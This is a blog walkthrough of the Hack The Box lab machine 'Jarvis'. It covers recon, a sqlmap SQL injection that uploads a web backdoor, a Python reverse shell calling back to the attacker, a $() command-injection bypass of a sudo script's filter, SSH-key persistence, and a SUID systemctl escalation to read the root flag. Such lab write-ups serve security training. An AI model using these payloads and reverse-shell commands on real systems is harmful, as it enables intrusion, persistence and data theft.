---
layout:     post
title:      HacktheBox - Padraignix 'Jarvis' Walkthough 
title2:     Hack the Box - Jarvis
date:       2019-11-09 10:00:00 -0400
summary:    HTB Jarvis machine walkthrough. Jarvis involved a SQL Injection and a web-shell for initial foothold into sudo and filter bypass to User pivot with a final systemctl abuse to pivot into root.
categories: hack-the-box
thumbnail:  cogs
keywords:   hackthebox,htb,pentest,redteam,writeup,walkthrough,jarvis,sql injection,suid
tags:
 - htb
 - sql-injection
 - systemctl
 - suid
 - walkthrough
 - writeup
---

<h1>Introduction</h1>
<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-jarvis/infocard.PNG' | relative_url }}">
</p>

<p>A medium level difficulty machine from HTB Jarvis involving SQL Injection and a web-shell into sudo and filter bypass to user pivot with a final systemctl abuse to root pivot. I will step through the methodology, approaches and musings from start to root flag.</p>

<h1>Initial Recon</h1>

<p>As usual, let us kick it off with a handy <code>nmap</code> scan of the host:</p>

{% highlight shell %}
nmap -sS -Pn -p1- -sV -sC --open -v 10.10.10.143
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-02 15:52 EDT
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

<p>Alright so looks like two separate web instances and an SSH session. Let's quickly look at the non-standard 64999 port.</p>

<p align="center">
<img src="{{ '/assets/htb-jarvis/initial-64999.PNG' | relative_url }}">
</p>

<p>Well that was rude... Let's hope that the other port looks a bit better. After poking around and getting some inspiration for my next Iron Man based vacation I didn't notice anything too obvious. Checking the various page sources didn't reveal any mystical either so decided to turn on Burpsuite and give the site a quick spider.</p>

<p align="center">
<img src="{{ '/assets/htb-jarvis/burp-spider.PNG' | relative_url }}">
</p>

<h1>User exploitation</h1>

<p>We can see from both manual investigation and through Burp that there is a parameter being passed to <code>room.php</code> as we go through the various rooms. Decided to fire off a sqlmap and see if we get any hits. </p>

{% highlight shell %}
sqlmap -u "http://10.10.10.143/room.php?cod=1" --os-shell
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.3.4#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[17:11:24] [INFO] testing connection to the target URL
[17:11:24] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:11:24] [INFO] testing if the target URL content is stable
[17:11:25] [INFO] target URL content is stable
[17:11:25] [INFO] testing if GET parameter 'cod' is dynamic
[17:11:25] [INFO] GET parameter 'cod' appears to be dynamic
[17:11:25] [INFO] heuristic (basic) test shows that GET parameter 'cod' might be injectable
...
[17:11:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[17:11:59] [INFO] GET parameter 'cod' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
...
sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 6194=6194

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: cod=1 AND SLEEP(5)
---
[17:14:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
[17:14:19] [INFO] going to use a web backdoor for command prompt
[17:14:19] [INFO] fingerprinting the back-end DBMS operating system
[17:14:19] [INFO] the back-end DBMS operating system is Linux
...
[17:15:37] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpuypql.php
[17:15:38] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpbdenp.php
[17:15:38] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'www-data'
os-shell> 
{% endhighlight %}

<p>Excellent! We popped ourselves a shell! www-data is not necessarily ideal, and the sqlmap shell is also not ideal, so let's get our own python shell file and upgrade a bit.</p>

{% highlight python %}
root@kali:/var/www/html# cat shell1.py
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.xxx.xxx",1337));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
{% endhighlight %}

<p>Moving it on to the host we setup a listener on our attacking machine and pull the trigger.</p>

{% highlight shell %}
nc -lvp 1337
Listening on [0.0.0.0] (family 2, port 1337)
Connection from 10.10.10.143 48892 received!
Linux jarvis 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux
 17:27:49 up  4:34,  0 users,  load average: 1.09, 1.18, 1.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
{% endhighlight %}

<p>Slightly better. Let's take a poke at what we see.<p>

{% highlight shell %}
$ cd home
$ ls -latr
total 12
drwxr-xr-x  3 root   root   4096 Mar  2  2019 .
drwxr-xr-x 23 root   root   4096 Mar  3  2019 ..
drwxr-xr-x  5 pepper pepper 4096 Oct  2 13:38 pepper
$ cd pepper
total 36
drwxr-xr-x 3 root   root   4096 Mar  2  2019 ..
-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc
-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile
-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout
drwxr-xr-x 2 pepper pepper 4096 Mar  2  2019 .nano
lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -> /dev/null
drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web
-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt
drwxr-xr-x 5 pepper pepper 4096 Oct  2 13:38 .
drwxr-xr-x 2 pepper pepper 4096 Oct  2 13:38 .ssh
$ cat user	
cat: user: No such file or directory
$ cat user.txt
cat: user.txt: Permission denied
{% endhighlight %}

<p>Doh! So close... At least we know the file is there. We now also know we need try and pivot to the user pepper. After a few minutes of poking around found something interesting with the sudo list.</p>

{% highlight shell %}
$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
{% endhighlight %}

<p>So we are trying to pivot to user and there just happens to be a defined rule that we can execute as that user? That seems promising. After a bit of poking through the script it seems that running <code>simpler.py</code> essentially pings a host that you pass as a parameter. It also looks like there is some forbidden character filters to prevent chaining commands - but that should not stop us.</p>

{% highlight python %}
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
{% endhighlight %}

<p>My initial thoughts were to leverage character encoding. I wanted to try and chain a <i>; nc -e /bin/sh 10.10.xxx.xxx 1337</i> on the ping command. After attempting a few different variations, including unicode and hex, without success I stumbled on to an <a href="https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html">excellent article</a> that seemed quite in line with what I was trying to achieve.</p>

{% highlight shell %}
A bash command can then be encapsulated using the $() technique. 
In the case below, we simply call the bash binary.
        
        NetMRI-VM-AD30-5C6CE> ping $(/bin/bash)
{% endhighlight %}

<p>So instead of trying to chain a command to the built-in ping how about encapsulating instead? Seems promising. Let's upload another python shell script and attempt to call the shell script as an encapsulated command.</p>

{% highlight shell %}
$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(python /tmp/shell3.py)
$(python /tmp/shell3.py)
{% endhighlight %}

<p>Then on the receiving end:</p>

{% highlight shell %}
nc -lvp 4444
Listening on [0.0.0.0] (family 2, port 4444)
Connection from 10.10.10.143 56170 received!
$ id
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
$ cd /home/pepper
$ ls
Web
user.txt
$ cat user.txt
2afa3**************************
{% endhighlight %}

<p>Victory. User credentials acquired.</p>

<h1>Root exploitation</h1>

<p>Now we needed to kick off a new privsec enumeration with the user pepper. No new sudo rules, however after running linprivcheck I noticed something interesting in the SUID/GUID section:</p>

{% highlight python %}
$ python linprivchecker.py
python linprivchecker.py
========================================================
LINUX PRIVILEGE ESCALATION CHECKER
========================================================

[*] GETTING BASIC SYSTEM INFO...

[+] Kernel
    Linux version 4.9.0-8-amd64 (debian-kernel@lists.debian.org) 
    (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.144-3.1 (2019-02-19)

[+] Hostname
    jarvis
...
[+] SUID/SGID Files and Directories
    -rwsr-xr-x 1 root root 30800 Aug 21  2018 /bin/fusermount
    -rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
    -rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
    -rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl
    -rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
    -rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
....
{% endhighlight %}

<p>Notice <code>/bin/systemctl</code> ? Looks like we have the ability to run it as pepper and since it has SUID set we may be able to exploit it to pivot into root. Quickly searching around I found a reference I will definitely keep handy moving forward - <a href="https://gtfobins.github.io/gtfobins/systemctl/#suid">gtfobins</a>. Unfortunately the shell I had on the host was not playing nice with this POC so had to take a tangent and get my shell upgraded first. Since we didn't know pepper's password we couldn't just ssh in as the user with the password, however we could do something that would still allow us to properly log in - ssh keys!</p>

{% highlight shell %}
root@kali:~/.ssh# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
...
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
root@kali:~/.ssh# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAA...IomvNOR1FcXBuOItl root@kali
{% endhighlight %}

<p>Then all we needed to do was insert the entry on the host.</p>

{% highlight shell %}
$ pwd
/home/pepper/.ssh
$ echo "ssh-rsa AAAAB3NzaC1yc2EAA...IomvNOR1FcXBuOItl root@kali" > authorized_keys
$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAA...IomvNOR1FcXBuOItl root@kali
{% endhighlight %}

<p>And just like that we are able to get into the host through normal ssh:</p>

{% highlight shell %}
root@kali:~/.ssh# ssh pepper@10.10.10.143
The authenticity of host '10.10.10.143 (10.10.10.143)' can't be established.
ECDSA key fingerprint is SHA256:oPoKu2vmqVfC1e3TJJ5ZB8yL/2/W2YIrglCm8FTTuSs.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.143' (ECDSA) to the list of known hosts.
Linux jarvis 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64

pepper@jarvis:~$ id
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
{% endhighlight %}

<p>Now that we have a proper shell we can turn our attention back to systemctl. As gtfobins states if systemctl <i>"runs with the SUID bit set and may be exploited to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor"</i>. They provide a POC that while it didn't work earlier, let's give it a try now that we have a proper shell. Similar to my <a href="{{ site.baseurl }}{% link _posts/hackthebox/2019-10-12-htb-machine-writeup.md %}">previous post</a> I wanted to keep it simple and go straight for the prize. This technique could be leveraged to call another reverse shell script that you previously uploaded to pop a root shell as well.</p>

{% highlight shell %}
pepper@jarvis:/tmp$ TF=$(mktemp).service
pepper@jarvis:/tmp$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output1"
> [Install]
> WantedBy=multi-user.target' > $TF
> 
pepper@jarvis:/tmp$ systemctl link $TF
Created symlink /etc/systemd/system/tmp.foyNai9pQt.service → /tmp/tmp.foyNai9pQt.service.

pepper@jarvis:/tmp$ systemctl enable --now $TF
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.foyNai9pQt.service → /tmp/tmp.foyNai9pQt.service.

pepper@jarvis:/tmp$ cat output1
d41d8***********************
{% endhighlight %}

<p>Victory! With that Jarvis is in the books.</p>

<h1>Post Root Cleanup</h1>

<p>I wouldn't be a good fellow hacker if I just left the root flag laying around like that. Once completed I reran the systemcl exploit changing the command to clean up after myself.</p>

{% highlight shell %}
pepper@jarvis:/tmp$ TF=$(mktemp).service
pepper@jarvis:/tmp$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "rm /tmp/output1"
> [Install]
> WantedBy=multi-user.target' > $TF
pepper@jarvis:/tmp$ systemctl link $TF
Created symlink /etc/systemd/system/tmp.s6W7MgAVfQ.service → /tmp/tmp.s6W7MgAVfQ.service.
pepper@jarvis:/tmp$ systemctl enable --now $TF
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.s6W7MgAVfQ.service → /tmp/tmp.s6W7MgAVfQ.service.
pepper@jarvis:/tmp$ ls -latr
{% endhighlight %}

<p>Thanks folks. Until next time.</p>
